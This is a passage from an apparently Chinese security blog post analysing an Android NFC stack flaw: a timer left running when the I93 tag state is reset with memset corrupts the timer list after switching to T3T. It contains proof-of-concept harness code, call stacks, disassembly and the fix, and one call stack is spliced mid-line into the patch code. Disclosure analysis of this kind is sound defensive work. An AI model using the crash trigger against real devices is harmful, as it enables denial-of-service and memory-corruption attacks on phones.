      }
将NFC开启,并进入discovery模式。
### part4
代码是：
    NFA_RwReadNDef();
    {
      std::unique_lock i93_detect_lock(cv_mutex);
      i93_detect_cv.wait(i93_detect_lock);
    }
NFA_RwReadNDef()会读取I93 tag里的数据,此时定时器开始启动用于检测是否超时,
下面是I93收到读请求后定时器被启动的调用栈：
    #0  nfc_start_quick_timer (p_tle=, type=, timeout=) at ../src/nfc/nfc/nfc_task.cc:190
    #1  0x00000000005f8874 in rw_i93_send_to_lower (p_msg=) at ../src/nfc/tags/rw_i93.cc:680
    #2  0x00000000005f916d in rw_i93_send_cmd_inventory (p_uid=, including_afi=, afi=) at ../src/nfc/tags/rw_i93.cc:740
    #3  0x0000000000618f82 in RW_I93DetectNDef () at ../src/nfc/tags/rw_i93.cc:3985
    #4  0x0000000000720e2e in nfa_rw_start_ndef_detection () at ../src/nfa/rw/nfa_rw_act.cc:1557
    #5  0x000000000071a76e in nfa_rw_read_ndef () at ../src/nfa/rw/nfa_rw_act.cc:1737
    #6  nfa_rw_handle_op_req (p_data=) at ../src/nfa/rw/nfa_rw_act.cc:2863
    #7  0x000000000070b144 in nfa_rw_handle_event (p_msg=) at ../src/nfa/rw/nfa_rw_main.cc:246
    #8  0x0000000000721df0 in nfa_sys_event (p_msg=) at ../src/nfa/sys/nfa_sys_main.cc:85
### part5
代码是：
    g_callback_tracker->SimulatePacketArrival(
          NCI_MT_NTF, 0, NCI_GID_CORE, NCI_MSG_CORE_RESET, reset_core.data(),
          reset_core.size());
      std::vector deactivate_rf = {NFA_DEACTIVATE_TYPE_DISCOVERY, 0x1};
      g_callback_tracker->SimulatePacketArrival(
          NCI_MT_NTF, 0, NCI_GID_RF_MANAGE, NCI_MSG_RF_DEACTIVATE,
          deactivate_rf.data(), deactivate_rf.size());
      {
        std::unique_lock deactivated_lock(cv_mutex);
        deactivated_cv.wait(deactivated_lock);
      }
这段代码关闭了NFC,目的是从i93顺利切换到T3T 。
### part 6
    std::vector activate_another_rf = {
          /* disc_id */ 0x0, NFC_DISCOVERY_TYPE_LISTEN_F, NFC_PROTOCOL_T3T};
      for (int i = 0; i SimulatePacketArrival(
          NCI_MT_NTF, 0, NCI_GID_RF_MANAGE, NCI_MSG_RF_INTF_ACTIVATED,
          activate_another_rf.data(), activate_another_rf.size());
      {
        std::unique_lock t3t_get_system_codes_lock(cv_mutex);
        t3t_get_system_codes_cv.wait(t3t_get_system_codes_lock);
      }
      NFA_Disable(true);
      {
        std::unique_lock nfa_disable_lock(cv_mutex);
        nfa_disable_cv.wait(nfa_disable_lock);
      }
part5中从I93
tag中读取了数据,并且启动定时器,我们必须在定时器过期前立即调用`RW_SetActivatedTagType`通知NFCC终止立即I93
Tag,并激活T3T Tag。
    g_callback_tracker->SimulatePacketArrival(NCI_MT_NTF,0,NCI_GID_RF_MANAGE,NCI_MSG_RF_INTF_ACTIVATED,activate_another_rf.data(),activate_another_rf.size());
就调用了RW_SetActivatedTagType ，
RW_SetActivatedTagType 代码为：
    tNFC_STATUS RW_SetActivatedTagType(tNFC_ACTIVATE_DEVT* p_activate_params,tRW_CBACK* p_cback) {
      ...
      memset(&rw_cb.tcb, 0, sizeof(tRW_TCB));
      ...
原来从一个状态切换到另一个状态的方法是调用`memset(&rw_cb.tcb, 0,
sizeof(tRW_TCB))`将TCB控制块全部置零清空,虽然看起来没错,但是把控制块清空并不等价于将上个状态的上下文被全部重置,他忽略了I93tag之前启动的定时器此时仍在工作,但新的tag也会启动自己的定时器,并改写TCB中相同偏移的数据。
TCB是被复用的,我们使用memset而非free,说明状态切换后,这块内存仍然存放的是TCB,所以此时系统里会出现两个定时器改写同一地址的情景。
以下是T3T tag下定时器向TCB中写入数据时代码:
    2367      *p_b = rw_t3t_mrti_base[e] * b; /* (B+1) * base (i.e T/t3t * 4^E) */
汇编是：
    1: x/5i $pc
    => 0x5de2a3 :        mov    %r12d,%eax
       0x5de2a6 :        shr    $0x6,%al
       0x5de2a9 :        movzbl %al,%eax
       0x5de2ac :        lea    0x813de0(,%rax,4),%rdi
       0x5de2b4 :        mov    %rdi,%rax
调用栈是：
    #0  rw_t3t_select (peer_nfcid2=, mrti_check=, mrti_update=) at ../src/nfc/tags/rw_t3t.cc:2393
    #1  0x000000000067ab9b in RW_SetActivatedTagType (p_activate_params=, p_cback=) at ../src/nfc/tags/rw_main.cc:290
    #2  0x00000000007153fd in nfa_rw_activate_ntf (p_data=) at ../src/nfa/rw/nfa_rw_act.cc:2630
    #3  0x000000000070b144 in nfa_rw_handle_event (p_msg=) at ../src/nfa/rw/nfa_rw_main.cc:246
    #4  0x000000000070a710 in nfa_rw_proc_disc_evt (event=1 '\001', p_data=, excl_rf_not_active=) at ../src/nfa/rw/nfa_rw_main.cc:184
    #5  0x00000000006b243d in nfa_dm_poll_disc_cback (event=, p_data=) at ../src/nfa/dm/nfa_dm_act.cc:1636
    #6  0x00000000006a397d in nfa_dm_disc_notify_activation (p_data=) at ../src/nfa/dm/nfa_dm_discover.cc:1238
    #7  0x0000000000697105 in nfa_dm_disc_sm_discovery (event=, p_data=0x7fff715200e0) at ../src/nfa/dm/nfa_dm_discover.cc:1918
### 崩溃现场
i93定时器仍存在于定时器链表中,t3t被激活后里面的数据被t3t定时器破坏.当t3t定时器也被插入链表头部时会产生段错误。
崩溃现场:
对应的源代码是while那行
    /* Find the entry that the new one needs to be inserted in front of */
          p_temp = p_timer_listq->p_first;
    =>>    while (p_tle->ticks > p_temp->ticks) {
            /* Update the tick value if looking at an unexpired entry */
            if (p_temp->ticks > 0) p_tle->ticks -= p_temp->ticks;
            p_temp = p_temp->p_next;
          }
下面这个调用栈并非poc的而是漏洞被发现时的,放在这仅供参考。
    (rr) bt
    #0  0x000000000075b6fd in GKI_add_to_timer_list (p_timer_listq=, p_tle=0x1221dd8 , p_tle@entry=0x7fff71517140) at ../fuzzer/gki_fuzz_fakes.cc:153
    #1  0x000000000059d1ce in nfc_start_quick_timer (p_tle=, type=, timeout=) at ../src/nfc/nfc/nfc_task.cc:216
    #2  0x00000000005e3c68 in rw_t3t_start_poll_timer (p_cb=) at ../src/nfc/tags/rw_t3t.cc:333
    #3  RW_T3tGetSystemCodes () at ../src/nfc/tags/rw_t3t.cc:2964
    #4  0x0000000000719a40 in nfa_rw_t3t_get_system_codes () at ../src/nfa/rw/nfa_rw_act.cc:2331
    #5  nfa_rw_handle_op_req (p_data=) at ../src/nfa/rw/nfa_rw_act.cc:2971
    #6  0x000000000071585d in nfa_rw_activate_ntf (p_data=) at ../src/nfa/rw/nfa_rw_act.cc:2677
    #7  0x000000000070b144 in nfa_rw_handle_event (p_msg=) at ../src/nfa/rw/nfa_rw_main.cc:246
    #8  0x000000000070a710 in nfa_rw_proc_disc_evt (event=1 '\001', p_data=, excl_rf_not_active=) at ../src/nfa/rw/nfa_rw_main.cc:184
    #9  0x00000000006b243d in nfa_dm_poll_disc_cback (event=, p_data=) at ../src/nfa/dm/nfa_dm_act.cc:1636
    #10 0x00000000006a397d in nfa_dm_disc_notify_activation (p_data=) at ../src/nfa/dm/nfa_dm_discover.cc:1238
    #11 0x0000000000697105 in nfa_dm_disc_sm_discovery (event=, p_data=0x7fff715200e0) at ../src/nfa/dm/nfa_dm_discover.cc:1918
    #12 nfa_dm_disc_sm_execute (event=, p_data=) at ../src/nfa/dm/nfa_dm_discover.cc:2533
    #13 0x000000000068f601 in nfa_dm_disc_discovery_cback (event=, p_data=) at ../src/nfa/dm/nfa_dm_discover.cc:727
    #14 0x00000000005b0a92 in nfc_ncif_proc_activate (p=, len=60 'protocol, p_activate_params->rf_tech_param.mode,
          p_activate_params->rf_tech_param.param.pa.sel_rsp);
      if (p_cback == nullptr) {
        LOG(ERROR) << StringPrintf(
            "RW_SetActivatedTagType called with NULL callback");
        return (NFC_STATUS_FAILED);
      }
      switch (rw_cb.tcb_type) {
        case RW_CB_TYPE_T1T: {
          nfc_stop_quick_timer(&rw_cb.tcb.t1t.timer);
          break;
        }
        case RW_CB_TYPE_T2T: {
          nfc_stop_quick_timer(&rw_cb.tcb.t2t.t2_timer);
          break;
        }
        case RW_CB_TYPE_T3T: {
          nfc_stop_quick_timer(&rw_cb.tcb.t3t.timer);
          nfc_stop_quick_timer(&rw_cb.tcb.t3t.poll_timer);
          break;
        }
        case RW_CB_TYPE_T4T: {
          nfc_stop_quick_timer(&rw_cb.tcb.t4t.timer);
          break;
        }
        case RW_CB_TYPE_T5T: {
          nfc_stop_quick_timer(&rw_cb.tcb.i93.timer);
          break;
        }
        case RW_CB_TYPE_MIFARE: {
          nfc_stop_quick_timer(&rw_cb.tcb.mfc.timer);
          nfc_stop_quick_timer(&rw_cb.tcb.mfc.mfc_timer);
          break;
        }
        case RW_CB_TYPE_UNKNOWN: {
          break;
        }
      }
      /* Reset tag-specific area of control block */
      memset(&rw_cb.tcb, 0, sizeof(tRW_TCB));
    ```
## 总结
近几年,安卓系统高危漏洞有多发于硬件设备的趋势,我们会持续关注该领域最新的漏洞利用,并呼吁各大厂商及时更新安全补丁。
了解更多相关信息，请关注公众号“墨云安全”。